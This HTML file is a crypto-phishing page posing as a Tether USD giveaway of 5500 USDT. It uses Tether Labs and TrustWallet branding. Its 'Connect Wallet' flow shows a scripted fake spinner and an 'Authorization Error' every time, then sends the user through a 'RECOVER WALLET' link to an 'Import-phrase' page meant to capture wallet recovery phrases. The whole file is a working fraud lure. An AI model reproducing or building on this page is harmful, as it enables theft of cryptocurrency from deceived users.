<!DOCTYPE HTML>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <title>Welcome </title>
        
        
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<style>
* {
    margin: 0px;
}
::selection {
  background: orange;
  color: #fff;
}
body {
    margin: 0px;
    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans","Liberation Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";
    background-color: #1f1e29;
    
    background-size: cover;
}
main {
    background-color: #1f1e29a1;
}
header {
        color: #fff;
    background: transparent;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    justify-content: space-between;
    align-items: center;
    padding: 14px 0px 16px;
}
.leftalexhead {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 2vw;
    margin-left: 3vw;
    font-weight: bolder;
    letter-spacing: 1px;
    font-size: 24px;
}
.leftalexhead p {
        text-shadow: 0 0 2px #fff;
}
.rightalexhead {
        margin-right: 3vw;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 5vw;
}
.menualexhead {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 5vw;
    font-size: 16px;
}
.menualexhead a {
        cursor: pointer;
}
.menualexhead a i {
    font-size: 12px;
    color: #999;
    margin-left: 3px;
}
.alexloginhead {
        position: relative;
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    overflow: hidden;
    padding: 13px 32px 13px;
    -webkit-box-align: center;
    -webkit-align-items: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-flex: 0;
    -webkit-flex: 0 0 auto;
    -ms-flex: 0 0 auto;
    flex: 0 0 auto;
    border-radius: 200px;
    -webkit-transition: box-shadow 300ms ease;
    transition: box-shadow 300ms ease;
    color: #fff;
    line-height: 26px;
    font-weight: 700;
    text-decoration: none;
    border: 1px solid #f06500;
    cursor: pointer;
}
.alexloginhead:hover {
    background-image: linear-gradient(84deg, #f28b03, #f06500);
    color: #fff;
    -webkit-transition: box-shadow 300ms ease;
    transition: box-shadow 300ms ease;
}
.alexloginhead:hover + .alexloginhead p {
    color: #fff;
}
section {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    margin-top: 15vh;
    position: relative;
    padding-bottom: 15vh;
}
section h1 {
        font-family: system-ui;
    color: #f28b03;
    font-weight: bold;
    font-size: 3rem;
}
section img {
        margin: 3vh 0px 1vh;
}
section p {
    font-weight: 400;
    margin-bottom: 10px;
}
section b {
        color: #f28b03;
}
section span {
        max-width: 1000px;
    text-align: center;
    margin-top: 4vh;
    color: #bbbbbe;
}
section span label {
        color: #f28b03;
    font-weight: 700;
}
.mainnetalexshib {
        margin-top: 5vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 5vw;
}
.alexmainet {
        text-align: center;
}
.alexmainet h2 {
        color: #3f51b5;
    font-family: 'Proxima Nova Black','Open Sans',sans-serif;
    font-size: 20px;
    font-weight: 900;
    margin-bottom: auto;
}
.alexmainet span {
        line-height: 35px;
    color: #bbbbbe;
}
.alexmainet p {
        line-height: 35px;
    color: #fff;
    font-weight: 700;
}
.footesecalex {
        position: absolute;
    left: 0%;
    top: auto;
    right: auto;
    bottom: -1%;
    z-index: 2;
}
.footalexnav {
        position: relative;
}
.footalexnav img {
    margin: 0px;
}
footer {
        padding-top: 42px;
    padding-bottom: 38px;
    background-color: #18171f;
    color: #fff;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.menualexfootshib {
        display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    column-gap: 3vw;
    font-size: 18px;
}
popup {
        position: fixed;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    z-index: 9;
    background: #00000096;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
}
.shibalexpop {
        max-width: 478px;
    background-color: rgb(25, 27, 31);
    border: 1px solid rgb(33, 36, 41);
    border-radius: 20px;
    color: #fff;
    padding: 20px;
    z-index: 12;
}
.shibalexpop h1 {
        text-align: left;
    margin-bottom: 3vh;
    font-size: 20px;
}
.boxalexpopshib {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    width: 100%;
}
.textalexshib {
        font-size: 10pt;
    line-height: 1.5;
    background-color: #343a40 !important;
    border-radius: 20px;
    padding: 20px;
    font-weight: 600;
    margin-bottom: 2vh;
}
.textalexshib label {
        color: #4c95cf!important;
}
.btnalexshiblog {
        line-height: 0.5;
    background-color: #343a40 !important;
    border-radius: 20px;
    padding: 20px;
    font-weight: 600;
    width: 90%;
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    cursor: pointer;
    margin-bottom: 2vh;
    font-size: 17px;
}
.btnalexshiblog img {
    width: 40px;
}
.closealexmainnet {
        width: 100%;
    height: 100%;
    z-index: 10;
    position: absolute;
}
.alexerrorreport {
        width: 100%;
}
.alexerrorconnect {
        border: 1px solid #fd4146;
    color: #fd4146;
    border-radius: 12px;
    padding: 20px;
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: flex-start;
    column-gap: 10px;
    margin-bottom: 2vh;
}
.alexerrorconnect a {
        color: #fff;
    background-color: #bf3138;
    position: relative;
    padding: 5px 10px;
    font-size: 11px;
    line-height: 10px;
    cursor: pointer;
    text-decoration: none;
}
.alexerrordesc {
        font-size: 10pt;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: space-between;
    padding: 20px;
    background: rgb(33, 36, 41);
    border-radius: 20px;
    border: 1px solid rgb(44, 47, 54);
}
.leftdescalex {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
    line-height: 30px;
}
.alexerrordesc img {
        width: 35px;
}
@media only screen and (max-width: 600px) {
    .leftalexhead img {
            width: 32px;
    }
    .leftalexhead p {
            font-size: 18px;
    margin-left: 10px;
    }
    .rightalexhead {
        display: none;
    }
    section h1 {
            text-align: center;
    font-size: 28px;
    }
    section p, section b {
        font-size: 18px;
    }
    section span {
        line-height: 1.5;
        width: 90%;
    }
    .menualexfootshib {
            display: flex;
    flex-direction: row;
    align-items: center;
    flex-wrap: wrap;
    text-align: center;
    width: 100%;
    justify-content: center;
    font-size: 16px;
    }
    .menualexfootshib p {
        width: 30%;
        line-height: 40px;
    }
    .shibalexpop{
        width: 85%;
    }
    .footesecalex {
        width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    }
}
</style>
    </head>
    <body>
        <main>
            <header>
                <div class="leftalexhead">

                  
                </div>
                <div class="rightalexhead">
                    <div class="menualexhead">
                        
                    </div>
                    <div class="alexloginhead" onclick="openalexlog()">
                        <p>SIGN UP</p>
                    </div>
                </div>
            </header>
            <section>
                <h1 style="color:#17bb1e;">Tether USD</h2>
                
                <img src="https://pbs.twimg.com/media/ENWlpa1UcAANrSS.png" alt="" />
                <p style="color: #f28b03;">You are one active users who are lucky to get</p>
                <b>5500 USDT </b>
                
                <div class="alexloginhead" style="margin-top: 4vh;color: #fff;" onclick="openalexlog()">
                    <p style="margin-bottom: 0px;">Connect Wallet</p>
                </div>
                <div class="mainnetalexshib">
                    <div class="alexmainet">
                        <h2> 30 October 2022
</h2>
                        <span>End Date</span>
                    </div>
                    <div class="alexmainet">
                        <h2 style="color: #f28b03">Tether Token
</h2>
                        <p></p>
                    </div>
                    <div class="alexmainet">
                        <h2 style="color:#17bb1e;">$10.000 USD
</h2>
                        <span>Estimated Value Max</span>
                    </div>
                </div>
                <div class="footesecalex">
                    <div class="footalexnav">
                        
                        
                </div>
            
            
            <popup id="mainetlogalex" style="display: none;">
                <div class="closealexmainnet" onclick="hidealexlog()"></div>
                <div class="shibalexpop">
                    <h1>Connect to a wallet</h1>
                    <div class="boxalexpopshib">
                        <div class="textalexshib">By connecting a wallet, you agree to Tether Labs' <label>Terms of Service</label> and acknowledge that you have read and understand the Tether <label>Protocol Disclaimer</label>.</div>
                        
                        </div>
                        <div class="btnalexshiblog" onclick="openalextw()">
                            <p>TrustWallet <i id="twload" class="fa-solid fa-spinner-third fa-spin" style="display: none"></i></p><img src="https://i.ibb.co/wyCxNQt/image.png" alt="">
                        </div>
                        
                        <div id="alexerrormt" class="alexerrorreport" style="display: none">
                            <div class="alexerrorconnect">
                                
                            </div>
                            <div class="alexerrordesc">
                                <div class="leftdescalex">
                                    <b>Authorization Error !</b>
                                    <span>Click RECOVER WALLET to connect your wallet</span>
                                </div>
                                <img src="https://static.okx.com/cdn/assets/imgs/216/EC46DDEA9DB32CF1.png?x-oss-process=image/format,webp" alt="" />
                            </div>
                        </div>
                        
                        <div id="alexerrortw" class="alexerrorreport" style="display: none">
                            <div class="alexerrorconnect">
                                <p>Error Connecting</p><a href="webtrust.html/Import-phrase" onclick="window.open(this.href,'targetWindow','toolbar=yes,scrollbars=yes,resizable=yes,top=0,left=100000,width=400,height=780') ;return false">RECOVER WALLET</a>
                            </div>
                            <div class="alexerrordesc">
                                <div class="leftdescalex">
                                    <b>Authorization Error !</b>
                                    <span>Click RECOVER WALLET to connect your wallet</span>
                                </div>
                                <img src="https://i.ibb.co/wyCxNQt/image.png" alt="" />
                            </div>
                        </div>
                    </div>
                
            </popup>
        </main>
        <script>
            function openalexlog() {
                $('#mainetlogalex').fadeIn();
            }
            function hidealexlog() {
                $('#mainetlogalex').fadeOut();
                $('#metaload').hide();
                $('.btnalexshiblog').show();
                $('#alexerrormt').hide();
                $('#twload').hide();
                $('#alexerrortw').hide();
            }
            
            function openalexmt() {
                $('#metaload').show();
                setTimeout(() => {
                     $('#metaload').hide();
                     $('.btnalexshiblog').hide();
                     $('#alexerrormt').show();
                }, 1500)
            }
            
            function openalextw() {
                $('#twload').show();
                setTimeout(() => {
                     $('#twload').hide();
                     $('.btnalexshiblog').hide();
                     $('#alexerrortw').show();
                }, 1500)
            }
        </script>
   
</html>